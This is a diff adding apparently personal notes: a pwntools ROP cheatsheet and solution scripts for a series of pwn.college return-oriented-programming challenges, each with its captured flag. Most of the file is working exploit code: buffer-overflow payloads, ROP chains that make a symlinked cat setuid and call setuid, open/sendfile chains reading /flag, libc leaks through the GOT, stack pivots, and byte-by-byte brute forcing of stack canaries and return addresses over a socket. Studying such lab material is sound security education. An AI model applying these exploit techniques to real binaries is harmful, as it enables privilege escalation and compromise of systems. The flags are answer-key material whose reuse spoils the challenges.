@@ -1,0 +1,772 @@
+pwntools cheatsheet
+
+
+elf = ELF('./target')
+rop = ROP(elf)
+
+# searching for specific gadgets
+pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+syscall = rop.find_gadget(['syscall', 'ret']).address
+
+# storing specific values in a rop chain
+rop.raw(pop_rax)
+rop.raw(59)
+rop.raw(syscall)
+
+# if you know the binary contains `pop rdi`, `pop rsi` gadgets, etc
+# you can just use `call` and pwntools will generate the instructions
+# e.g. 
+# pop rdi; ret
+# 0xdeadbeef
+# puts
+rop.call(elf.sym.puts, [0xdeadbeef])
+
+# you can search for strings with the elf objects too
+libc = ELF('./libc.so.6')
+bin_sh = next(libc.search(b'/bin/sh'))
+
+# combining all of these together you can do some pretty interesting stuff
+rop.call(libc.sym.setreuid, [0, 0])
+rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])
+
+# generating the bytecode
+rop.chain()
+
+# maybe you want to print it for debugging?
+print(rop.dump())
+
+
+
+1.0. pwn.college{sGblGu7kn90aNdiohXYvpbxyidW.QXxQzMsITNxUzW}
+
+# 56 size of buff to ret addr, 0x402584 is addr of win()
+info(p.readrepeat(1))
+p.send(b'a'*56+p64(0x402584)) 
+info(p.readrepeat(1))
+
+1.1. pwn.college{o8BLjZYAbXOYdHF2PVqJzTcPQ9f.QXyQzMsITNxUzW}
+
+same as above with 0x4016ea as addr of win()
+
+2.0. pwn.college{kLrm66q4hTPhKJB-6IzbPKx36fw.QXzQzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*104 # buf - ret addr
+    +p64(0x401E71) # win_stage1
+    +p64(0x401F1E) # win_stage2
+) 
+info(p.readrepeat(1))
+
+2.1. pwn.college{shrTZiPtbVaLDiQx2s8LxaQAJz9.QX0QzMsITNxUzW}
+
+same as above using
+
+b'a'*136 # buf - ret addr
++p64(0x401eac) # win_stage1
++p64(0x401f59) # win_stage2
+
+3.0. pwn.college{4g4AR0qaQh_iEyLNJ1r_ngMsF7L.QX1QzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*56 # buf - ret addr
+    +p64(0x402213) # pop rdi; ret;
+    +p64(0x1)
+    +p64(0x401D47) # win_stage1
+    +p64(0x402213) 
+    +p64(0x2)
+    +p64(0x401C67) # win_stage2
+    +p64(0x402213) 
+    +p64(0x3)
+    +p64(0x401E23) # win_stage3
+    +p64(0x402213) 
+    +p64(0x4)
+    +p64(0x401B81) # win_stage4
+    +p64(0x402213) 
+    +p64(0x5)
+    +p64(0x401A9E) # win_stage5
+) 
+info(p.readrepeat(1))
+
+3.1. pwn.college{I1lBjQtbOymtqJxP4dPz8jT6Y0j.QX2QzMsITNxUzW}
+
+same using 
+b'a'*72 # buf - ret addr
++p64(0x401873) # pop rdi; ret;
++p64(0x1)
++p64(0x4012b0) # win_stage1
++p64(0x401873) 
++p64(0x2)
++p64(0x401637) # win_stage2
++p64(0x401873) 
++p64(0x3)
++p64(0x40146f) # win_stage3
++p64(0x401873) 
++p64(0x4)
++p64(0x401551) # win_stage4
++p64(0x402213) 
++p64(0x5)
++p64(0x40138c) # win_stage5
+
+4.0 pwn.college{shs2kkqRp8-RltUsDKzaTwYMwAk.QX3QzMsITNxUzW}
+rp++ --unique -r2 -f /challenge/$HOSTNAME
+ln -s /usr/bin/cat call 
+
+p.send(
+        b'a'*40 # buf - ret addr
+        +p64(0x401d02) # pop rax; ret;
+        +p64(90)      # 90
+        +p64(0x401d39) # pop rdi; ret;
+        +p64(0x403146) # "call"
+        +p64(0x401d11) # pop rsi; ret;
+        +p64(0x9ed) # 04755
+        +p64(0x401d09) # syscall; ret;
+        +p64(0x401d02) # pop rax; ret;
+        +p64(102) # 60
+        +p64(0x401d09) # syscall; ret;
+        +p64(0x401d02) # pop rax; ret;
+        +p64(60) # 60
+        +p64(0x401d39) # pop rdi; ret;
+        +p64(0x61) # 0x61 = 'a'
+        +p64(0x401d09) # syscall; ret;
+    ) 
+
+4.1. pwn.college{oDKUKKrRHHRCIdLgAUlxCDQGKq0.QX4QzMsITNxUzW}
+
+ln -s /usr/bin/cat puts
+
+p.send(
+        b'a'*56 # buf - ret addr
+        +p64(0x401699) # pop rax; ret;
+        +p64(90)      # 90
+        +p64(0x401688) # pop rdi; ret;
+        +p64(0x4004C3) # "puts"
+        +p64(0x4016a0) # pop rsi; ret;
+        +p64(0x9ed) # 04755
+        +p64(0x401690) # syscall; ret;
+        +p64(0x401699) # pop rax; ret;
+        +p64(102) # 102
+        +p64(0x401690) # syscall; ret;
+        +p64(0x401699) # pop rax; ret;
+        +p64(60) # 60
+        +p64(0x401688) # pop rdi; ret;
+        +p64(0x61) # 0x61 
+        +p64(0x401690) # syscall; ret;
+        
+    ) 
+
+
+5.0. pwn.college{0IOK6nue7y0ocF2Awz0zIDIWNj9.QX5QzMsITNxUzW}
+
+ln -s /usr/bin/cat call
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*56 # buf - ret addr
+    +p64(0x401eab) # pop rax; ret;
+    +p64(90)      # 90
+    +p64(0x401eda) # pop rdi; ret;
+    +p64(0x403146) # "call"
+    +p64(0x401eca) # pop rsi; ret;
+    +p64(0x9ed) # 04755
+    +p64(0x401ed2) # syscall; ret;
+    +p64(0x401eab) # pop rax; ret;
+    +p64(102) # 102
+    +p64(0x401ed2) # syscall; ret;
+    +p64(0x401eab) # pop rax; ret;
+    +p64(60) # 60
+    +p64(0x401eda) # pop rdi; ret;
+    +p64(0x61) # 0x61 
+    +p64(0x401ed2) # syscall; ret;
+    
+) 
+info(p.readrepeat(1))
+
+
+5.1. pwn.college{IZC0K-ncqz8wRdINB-HDgI6YGmS.QXwUzMsITNxUzW}
+
+ln -s /usr/bin/cat puts
+
+p.send(
+    b'a'*56 # buf - ret addr
+    +p64(0x4020e2) # pop rax; ret;
+    +p64(90)      # 90
+    +p64(0x4020f9) # pop rdi; ret;
+    +p64(0x4004C3) # "puts"
+    +p64(0x402101) # pop rsi; ret;
+    +p64(0x9ed) # 04755
+    +p64(0x4020d9) # syscall; ret;
+    +p64(0x4020e2) # pop rax; ret;
+    +p64(102) # 102
+    +p64(0x4020d9) # syscall; ret;
+    +p64(0x4020e2) # pop rax; ret;
+    +p64(60) # 60
+    +p64(0x4020f9) # pop rdi; ret;
+    +p64(0x61) # 0x61 
+    +p64(0x4020d9) # syscall; ret;
+    
+) 
+
+
+6.0. pwn.college{YzI5ltbrO2hWXDP1o_CgUPGj4YZ.QXxUzMsITNxUzW}
+rp++ --unique -r2 -f /challenge/$HOSTNAME
+
+# open("/flag", 0)
+pop_rdi = p64(0x40198e)
+pop_rsi = p64(0x40197e)
+open_plt = p64(0x4011d0)
+# sendfile(1, open(), 0, 1000)
+sendfile_plt = p64(0x4011a0)
+pop_rdi = p64(0x40198e)
+pop_rsi = p64(0x40197e)
+pop_rdx = p64(0x401986)
+pop_rcx = p64(0x401996)
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*40+ # buf - ret addr
+    pop_rdi+
+    p64(0x402146)+ # "call"
+    pop_rsi+
+    p64(0)+
+    open_plt+
+    pop_rdi+
+    p64(1)+
+    pop_rsi+
+    p64(3)+
+    pop_rdx+
+    p64(0)+
+    pop_rcx+
+    p64(1000)+
+    sendfile_plt
+) 
+info(p.readrepeat(1))
+
+6.1. pwn.college{4dmEoE7sOTstoitzrGKmeJ5FE-_.QXyUzMsITNxUzW}
+
+pop_rdi = p64(0x4021d1)
+pop_rsi = p64(0x4021b9)
+pop_rdx = p64(0x4021c1)
+pop_rcx = p64(0x4021c9)
+# open("/flag", 0)
+open_plt = p64(0x401100)
+# sendfile(1, open(), 0, 1000)
+sendfile_plt = p64(0x4010e0)
+
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*88+ # buf - ret addr
+    pop_rdi+
+    p64(0x4004FC)+ # "puts"
+    pop_rsi+
+    p64(0)+
+    open_plt+
+    pop_rdi+
+    p64(1)+
+    pop_rsi+
+    p64(3)+
+    pop_rdx+
+    p64(0)+
+    pop_rcx+
+    p64(1000)+
+    sendfile_plt
+) 
+info(p.readrepeat(1))
+
+
+7.0. pwn.college{0yNLY1ncQ7VIdq4xSanINjewrPT.QXzUzMsITNxUzW}
+
+ln -s /usr/bin/cat call
+
+info(p.readuntil(b'is: '))
+addr = p.readlineb() 
+system_libc = flat(addr[:14], endian='little')
+system_addr = int(system_libc,16)
+libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+libc.address = system_addr - libc.symbols['system']
+rop = ROP(libc)
+pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+call = p64(0x403146)
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*88+ # buf - ret addr
+    pop_rax+p64(90)+pop_rdi+call+pop_rsi+p64(0x9ed)+syscall+
+    pop_rax+p64(0x69)+syscall
+) 
+info(p.readrepeat(1))
+
+7.1. pwn.college{IuQELmOCtG4QdEs3FPXz6rRu_S6.QX0UzMsITNxUzW}
+
+ln -s /usr/bin/cat Leaving!
+
+info(p.readuntil(b'is: '))
+addr = p.readlineb() 
+system_libc = flat(addr[:14], endian='little')
+system_addr = int(system_libc,16)
+libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+libc.address = system_addr - libc.symbols['system']
+rop = ROP(libc)
+pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+leaving = p64(0x402041)
+
+info(p.readrepeat(1))
+p.send(
+    b'a'*136+ # buf - ret addr
+    pop_rax+p64(90)+pop_rdi+leaving+pop_rsi+p64(0x9ed)+syscall+
+    pop_rax+p64(0x69)+syscall
+) 
+info(p.readrepeat(1))
+
+8.0. pwn.college{MlFxq8iyX-3fyuvcb6U09_TpGf5.QX1UzMsITNxUzW}
+
+1. make symlink for "Leaving!"
+
+libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+
+vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
+vuln_rop = ROP(vuln_elf)
+
+libc_func = "puts"
+PUTS_PLT = p64(vuln_elf.plt['puts'])
+MAIN_PLT = p64(vuln_elf.symbols['challenge'])
+POP_RDI = p64(vuln_rop.find_gadget(['pop rdi', 'ret']).address)
+RET = p64(vuln_rop.find_gadget(['ret']).address)
+
+PUTS_GOT = p64(vuln_elf.got['puts'])
+
+OFFSET = b'a'*152
+info(p.readrepeat(1))
+p.send(
+    OFFSET + POP_RDI + PUTS_GOT + PUTS_PLT + MAIN_PLT
+) 
+info(p.readuntil(b'Leaving!\n'))
+addr = p.readlineb().strip()
+addr = b'\x20' + flat(addr, endian='little')
+addr = int.from_bytes(addr, "little")
+libc.address = addr - libc.symbols['puts']
+rop = ROP(libc)
+pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+leaving = p64(0x4035DA)
+
+info(p.readrepeat(1))
+p.send(
+    OFFSET+
+    pop_rax+p64(90)+pop_rdi+leaving+pop_rsi+p64(0x9ed)+syscall+
+    pop_rax+p64(0x69)+syscall
+)
+info(p.readrepeat(1))
+
+8.1. pwn.college{oHioN-2SgeElcEOhLOcZ0ge92ZW.QX2UzMsITNxUzW}
+
+same as 8.0 just change the address of "Leaving!"
+
+9.0. pwn.college{oa5dTizxqQlVBeJks8Q2pbEhcRB.QX3UzMsITNxUzW}
+libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+
+vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
+vuln_rop = ROP(vuln_elf)
+
+POP_RBP = p64(vuln_rop.find_gadget(['pop rbp', 'ret']).address)
+LEAVE = p64(vuln_rop.find_gadget(['leave', 'ret']).address)
+bss = p64(0x4150E0+16)
+
+libc_func = "puts"
+PUTS_PLT = p64(vuln_elf.plt['puts'])
+MAIN_PLT = p64(vuln_elf.symbols['challenge'])
+POP_RDI = p64(vuln_rop.find_gadget(['pop rdi', 'ret']).address)
+RET = p64(vuln_rop.find_gadget(['ret']).address)
+PUTS_GOT = p64(vuln_elf.got['puts'])
+
+info(p.readrepeat(1))
+p.send(
+    POP_RBP + bss + LEAVE + POP_RDI + PUTS_GOT + PUTS_PLT + MAIN_PLT
+)
+
+info(p.readuntil(b'Leaving!\n'))
+addr = p.readlineb().strip()
+addr = b'\x20' + flat(addr, endian='little')
+addr = int.from_bytes(addr, "little")
+libc.address = addr - libc.symbols['puts']
+rop = ROP(libc)
+pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+leaving = p64(0x4037BF)
+bss = p64(0x415118+16)
+
+info(p.readrepeat(1)) 
+p.send(
+    POP_RBP + bss + LEAVE + RET + RET + RET + RET + RET + RET + RET +
+    pop_rax+p64(0x5a)+pop_rdi+leaving+pop_rsi+p64(0x9ed)+syscall+
+    pop_rax+p64(0x69)+syscall
+)
+info(p.readrepeat(1))
+
+
+9.1. pwn.college{wqD6pT2l7OYZKLwxzPX-zlIeHdm.QX4UzMsITNxUzW}
+
+same as above but 
+first bss = p64(0x414080+16)
+second bss = p64(0x4140b8+16)
+leaving = p64(0x402004)
+
+
+10.0. pwn.college{Q5ECz1SGYNortN2mtQXAKmboyus.QX5UzMsITNxUzW}
+def challenge10():
+    buff_size = 8
+    leave_offset = b'\x6e'
+    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
+        info(p.readuntil(b'located at: '))
+        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
+        p.send(
+            addr * buff_size + leave_offset
+        )
+        info(p.readrepeat(1))
+
+10.1. pwn.college{wB5vtPyo8SaTYcaS0uRzp7t37Dd.QXwYzMsITNxUzW}
+
+changes...
+    buff_size = 14
+    leave_offset = b'\x76'
+
+11.0. pwn.college{8EWBVZ09_5Wkmxx9AvNmuowK8xB.QXxYzMsITNxUzW}
+def challenge11():
+    buff_size = 16
+    leave_offset = b'\x1e'
+    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
+        info(p.readuntil(b'located at: '))
+        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
+        p.send(
+            addr * buff_size + leave_offset
+        )
+        info(p.readrepeat(1))
+
+11.1. pwn.college{8fB12gBMoNHbPKpSCQhLJvc_T0j.QXyYzMsITNxUzW}
+changes...
+    buff_size = 12
+    leave_offset = b'\x8c'
+
+
+12.0. pwn.college{EciTi8ptvHlVqqXlqid3Ve2sPMl.QXzYzMsITNxUzW}
+
+while true; do python3 rop.py | grep leave -a10; done
+
+def challenge12():
+    buff_size = 14
+    leave_offset = b'\x67\x36\x0e'
+    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
+        info(p.readuntil(b'located at: '))
+        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
+        info(f'[LEAK] {addr}')
+        p.send(
+            addr * buff_size + leave_offset
+        )
+        info(p.readrepeat(1))
+
+12.1. pwn.college{8PCKJW7tFmXGOWEY3Ydcq70NNsn.QX0YzMsITNxUzW}
+
+while true; do python3 rop.py | grep pwn; done
+
+changes...
+    buff_size = 22
+
+13.0. pwn.college{ot8xDg5ui0aXtqBWFFrA3k4rtzm.QX1YzMsITNxUzW}
+
+ln -s /usr/bin/cat libc_intl_domainname
+
+def challenge13():
+    buffer = b'a'*40
+    padding = b'b'*8
+    _libc_start_main_offset = 0x32
+    
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
+    
+    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
+
+        info(p.readuntil(b'located at: '))
+        canary_address = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*5))
+        p.sendline(
+            canary_address
+        )
+        info(p.readuntil(b'= '))
+        canary = p64(int(hex(int(p.readlineb().strip()[2:].decode(),16)),16))
+        p.send(
+            buffer + canary + padding + p8(_libc_start_main_offset)
+        )
+
+        info(p.readuntil(b'located at: '))
+        libcstart_addr = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*7))
+        p.sendline(
+            libcstart_addr
+        )
+
+        info(p.readuntil(b'= '))
+        libc_repeat = p64(int(p.readlineb().strip()[2:].decode(),16)-0x83+_libc_start_main_offset)
+        p.send(
+            buffer + canary + padding + libc_repeat
+        )
+
+        info(p.readuntil(b'located at: '))
+        main_addr = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*11))
+        p.sendline(
+            main_addr
+        )
+
+        info(p.readuntil(b'= '))
+        main_plt = int(p.readlineb().strip()[2:].decode(), 16)
+        puts_plt = main_plt-(vuln_elf.symbols['main']-vuln_elf.plt['puts']+0x4)
+        puts_got = main_plt+(vuln_elf.got['puts']-vuln_elf.symbols['main'])
+        pop_rdi = main_plt+856
+
+        p.send(
+            buffer + canary + padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + libc_repeat 
+        )
+
+        info(p.readuntil(b'### Goodbye!\n'))
+        addr = p.readlineb().strip()
+        addr = b'\x20' + flat(addr, endian='little')
+        addr = int.from_bytes(addr, "little")
+        libc.address = addr - libc.symbols['puts']
+
+        rop = ROP(libc)
+        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
+
+        p.sendline(
+            main_addr
+        )
+        info(p.readrepeat(1))
+        p.send(
+            buffer + canary + b'c'*8 +
+            pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
+            pop_rax+p64(0x69)+syscall
+        )    
+        info(p.readrepeat(1))
+
+13.1. pwn.college{49_mpha6J_v82KJI2V3TvluYshz.QX2YzMsITNxUzW}
+
+changes...
+    buffer = b'a'*40
+    padding = b'b'*8
+    _libc_start_main_offset = 0x32
+    pop_rdi_offset = 464 # use rp++ to find gadget offset and subtract from main@plt
+
+
+
+14.0. pwn.college{4ewSSsrp3cbLQKpRriYYNeWM0II.QX3YzMsITNxUzW}
+challenge14():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
+    offset = b'a' * 72
+    ret_addr_offset = 0x2a84
+    pop_rdi_offset = 0x2b13
+
+    payload = offset + p8(0)
+
+    for _ in range(7):
+        for i in range(256):
+            r = remote("localhost", 1337, level='CRITICAL')
+            r.clean()
+            r.send(payload + p8(i))
+            check_stack = r.clean()
+            if b'stack smashing' not in check_stack:
+                info(f'correct byte is {hex(i)}')
+                payload += p8(i)
+                break
+            else:
+                r.close()
+
+    payload += b'b'*8 
+    ret_addr_bytes = b''
+    ret_addr_array = []
+
+    for _ in range(8):
+        for i in range(256):
+            r = remote("localhost", 1337, level='CRITICAL')
+            r.clean()
+            r.send(payload + ret_addr_bytes + p8(i))
+            check_stack = r.clean()
+            if b'### Goodbye!' in check_stack:
+                info(f'correct byte is {hex(i)}')
+                ret_addr_bytes += p8(i)
+                ret_addr_array.append(i)
+                break
+            else:
+                r.close()
+
+    bytes_val = b''
+    for a in ret_addr_array:
+        bytes_val += a.to_bytes(2, 'little')[:-1]
+
+    ret_addr = int.from_bytes(bytes_val, "little")
+
+    main_plt = ret_addr-(ret_addr_offset-vuln_elf.symbols['main'])
+    puts_plt = main_plt-(vuln_elf.symbols['main']-vuln_elf.plt['puts']+0x4)
+    puts_got = main_plt+(vuln_elf.got['puts']-vuln_elf.symbols['main'])
+    pop_rdi = main_plt+(pop_rdi_offset-vuln_elf.symbols['main'])
+
+    r = remote("localhost", 1337, level='CRITICAL')
+    r.clean()
+    r.send(payload + p64(pop_rdi)+p64(puts_got)+p64(puts_plt))
+
+    info(r.readuntil(b'Leaving!\n'))
+    addr = r.readlineb().strip()
+    addr = b'\x20' + flat(addr, endian='little')
+    addr = int.from_bytes(addr, "little")
+    print(hex(addr))
+    libc.address = addr - libc.symbols['puts']
+
+    rop = ROP(libc)
+    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+    trash_string = p64(next(libc.search(b'libc_intl_domainname')))
+
+    r = remote("localhost", 1337, level='CRITICAL')
+    r.clean()
+    r.send(payload+
+        pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
+        pop_rax+p64(0x69)+syscall
+    )
+    info(r.clean())
+
+
+14.1. pwn.college{I24QoJwy1-vawXgYkEjEFUWHNh6.QX4YzMsITNxUzW}
+changes...
+    offset = b'a' * 40
+    ret_addr_offset = 0x18a5
+    pop_rdi_offset = 0x1933
+
+15.0. pwn.college{EpF04i64UkLtJ9Hl3uP1aJ9QiV4.QX5YzMsITNxUzW}
+
+def challenge15():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
+    offset = b'a' * 40
+    ret_addr_offset = 0x24083
+
+    payload = offset + p8(0)
+
+    for n in range(7):
+        for i in range(256):
+            r = remote("localhost", 1337, level='CRITICAL')
+            r.clean()
+            r.send(payload + p8(i))
+            check_stack = r.clean()
+            if b'stack smashing' not in check_stack:
+                info(f'correct byte is for canary {n} is {hex(i)}')
+                payload += p8(i)
+                r.close()
+                break
+            else:
+                r.close()
+
+    payload += b'b'*8
+    ret_addr_bytes = b'\x14'
+    ret_addr_array = [0x14]
+
+    for _ in range(4):
+        for i in range(256):
+            r = remote("localhost", 1337, level='CRITICAL')
+            r.clean()
+            r.send(payload + ret_addr_bytes + p8(i))
+            check_stack = r.clean()
+            # info(check_stack)
+            if b'Welcome' in check_stack:
+                info(f'correct byte is {hex(i)}')
+                ret_addr_bytes += p8(i)
+                ret_addr_array.append(i)
+                r.close()
+                break
+            else:
+                r.close()
+
+    ret_addr_array.append(0x7f)
+    ret_addr_array.append(0x00)
+    ret_addr_array.append(0x00)
+
+    bytes_val = b''
+    for a in ret_addr_array:
+        bytes_val += a.to_bytes(2, 'little')[:-1]
+
+    ret_addr = int.from_bytes(bytes_val, "little")
+    ret_addr = ret_addr + (0x83-0x14)
+    addr = ret_addr - (ret_addr_offset-libc.symbols['__libc_start_main'])
+    libc.address = addr - libc.symbols['__libc_start_main']
+    
+    rop = ROP(libc)
+    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+    trash_string = p64(next(libc.search(b'libc_intl_domainname')))
+
+    r = remote("localhost", 1337, level='CRITICAL')
+    r.clean()
+    r.send(payload+
+        pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
+        pop_rax+p64(0x69)+syscall
+    )
+    info(r.clean())
+
+
+15.1. pwn.college{8VyjDRIIMqWuT_H_1KfX3Zg-CaR.QXwczMsITNxUzW}
+changes...
+    offset = b'a' * 56
+
+
+
+
+
+0x0000556461402a70
+0x0000556461401320
+
+0x00007fc0ff693f90 start of __libc_start_main
+0x00007fc0ff694083 return in __libc_start_main
+
+
+0x00007f57225e0083 start of __libc_start_main
+0x00007f57225dff90 return in __libc_start_main
+0x23f90 offset of __libc_start_main
+
+
+
+
+
+
+
+rp++ --unique -r2 -f /challenge/$HOSTNAME
+rp++ --unique -r2 -f /lib/x86_64-linux-gnu/libc.so.6 | grep leave
+
+
+
+0x7fff416da9c8
+
+
+0000000000084420
+leave -> mov rsp, rbp; pop rbp;
+ret -> pop rax; call rax;
+
+
+
+1. overrite exit got address with start of func()
+2. leak libc address 
+3. 
